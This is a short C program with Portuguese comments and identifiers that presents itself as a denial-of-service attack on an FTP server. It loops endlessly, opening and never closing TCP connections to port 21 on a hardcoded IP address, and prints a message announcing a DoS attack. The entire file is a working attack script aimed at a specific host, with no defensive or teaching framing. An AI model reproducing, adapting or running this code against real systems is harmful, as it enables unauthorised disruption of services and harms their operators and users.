#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (void){

	int socket_aberto;
	int conexao;
	int contador;
	int inicio = 0;

	struct sockaddr_in alvo;
	
		
	for(contador = 1;  contador > inicio; contador++){
		socket_aberto = socket(AF_INET, SOCK_STREAM, 0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons (21);
		alvo.sin_addr.s_addr = inet_addr("37.59.174.225");

		conexao = connect(socket_aberto,(struct sockaddr*)&alvo, sizeof alvo);
		printf("Realizando ataque DoS no FTP\n");
	}

}
